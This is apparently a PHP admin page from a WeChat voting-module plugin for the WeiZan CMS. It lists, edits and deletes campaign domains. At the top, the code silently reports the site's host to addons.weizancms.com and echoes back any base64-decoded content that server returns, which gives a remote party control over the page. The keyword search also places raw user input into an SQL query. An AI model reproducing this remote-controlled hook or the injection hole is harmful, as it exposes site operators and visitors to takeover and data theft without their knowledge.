<?php
/**
 * 钻石投票模块-域名
 */

defined('IN_IA') or exit('Access Denied');
global $_GPC, $_W;
$module=$this->modulename;
$api = 'http://addons.weizancms.com/web/index.php?c=user&a=api&module='.$module.'&domain='.$_SERVER['HTTP_HOST'];
$result=@file_get_contents($api);
if(!empty($result)){
	$result=json_decode($result,true);
    if($result['type']==1){
	    echo base64_decode($result['content']);
	    exit;
    }
}
$uniacid=$_W['uniacid'];
$rid=intval($_GPC['rid']);
$op = !empty($_GPC['op']) ? $_GPC['op'] : 'display';


// $upsql = <<<EOF
//  CREATE TABLE IF NOT EXISTS `ims_tyzm_diamondvote_domainlist` (
//    `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
//    `uniacid` int(11) DEFAULT '0',
//    `rid` int(11) DEFAULT '0',
//    `type` tinyint(1) DEFAULT '0' COMMENT '1，主域名，0备选域名',
//    `domain` varchar(50) COMMENT '域名',
//    `extensive` tinyint(1) DEFAULT '0' COMMENT '是否泛域名',
//    `status` tinyint(1) DEFAULT '0',
//    `createtime` int(10) DEFAULT '0' COMMENT '时间',
//    PRIMARY KEY (`id`),
//    KEY `content` (`domain`),
//    KEY `indx_uniacid` (`uniacid`)
//  ) ENGINE=MyISAM  DEFAULT CHARSET=utf8 AUTO_INCREMENT=1 ;
// EOF;
// pdo_run($upsql);	

if($op=='display'){

    $reply = pdo_fetch("SELECT title FROM " . tablename($this->tablereply) . " WHERE rid = :rid ORDER BY `id` DESC", array(':rid' => $rid));

	$pindex = max(1, intval($_GPC['page']));
	$psize = 20;
	$condition="";
	if (!empty($_GPC['keyword'])) {
		$condition .= " AND CONCAT(`domain`) LIKE '%{$_GPC['keyword']}%'";
	}

	$condition .="AND rid=$rid  ORDER BY type DESC,id DESC ";


	$list = pdo_fetchall("SELECT * FROM ".tablename($this->tabledomainlist)." WHERE uniacid = '{$uniacid} '  $condition   LIMIT ".($pindex - 1) * $psize.",{$psize}");

	if (!empty($list)) {
		 $total = pdo_fetchcolumn('SELECT COUNT(*) FROM ' . tablename($this->tabledomainlist) . " WHERE uniacid = '{$uniacid}' $condition");
		 $pager = pagination($total, $pindex, $psize); 
	 }
}
if($op=='post'){
	$domain=trim($_GPC['domain']);
	$id=intval($_GPC['id']);
	$type=intval($_GPC['type']);

	

	if($_W['ispost']){

		$typed = pdo_get($this->tabledomainlist, array('uniacid' => $_W['uniacid'],'rid' => $rid, 'type' =>1), array('id'));
	  	//print_r($typed);exit;
	    if(!empty($type) && $typed['id']!=$id){
	       $reup=pdo_update($this->tabledomainlist,array('type' => '0') , array('id' => $typed['id']));
	    }

		if(empty($domain)){message('域名不能为空', 'error');}
		$data = array(
			'uniacid'=>$_W['uniacid'],
			'rid'=>$rid,
			'type' => $type,
			'domain'=>$domain,
			'extensive'=>intval($_GPC['extensive']),
			'description'=>$_GPC['description'],
			'status'=>intval($_GPC['status']),
			'createtime'=>time()
		);	
		// $re=pdo_insert($this->tabledomainlist, $data);
		if (!empty($id)) {
		   $re=pdo_update($this->tabledomainlist, $data, array('id' => $id));
	    } else {
		   $re=pdo_insert($this->tabledomainlist, $data);
		}		

		if($re){
			message('更新成功！', $this->createWebUrl('domainlist', array('name' => 'tyzm_diamondvote','rid'=>$rid)), 'success');
		}else{
			message('更新失败，', $this->createWebUrl('domainlist', array('name' => 'tyzm_diamondvote','rid'=>$rid)),'error');
			//$re=pdo_update($this->tabledomainlist,array('extensive' => 1) , array('id' => $extensive['id']));
		}

	}
    if(!empty($id)){
		$list= pdo_get($this->tabledomainlist, array('id' => $id,'rid'=>$rid));
    }
}

if($op=='delete'){
	$id=intval($_GPC['id']);
	$re=pdo_delete($this->tabledomainlist,array('id' => $id,'rid' => $rid,'uniacid' => $uniacid));
	if($re){
		message('删除成功！', $this->createWebUrl('domainlist', array('name' => 'tyzm_diamondvote','rid'=>$rid)), 'success');
	}else{
		message('删除失败，不存在该名单！',$this->createWebUrl('domainlist', array('name' => 'tyzm_diamondvote','rid'=>$rid)),'error');
	}
}

include $this->template('domainlist');

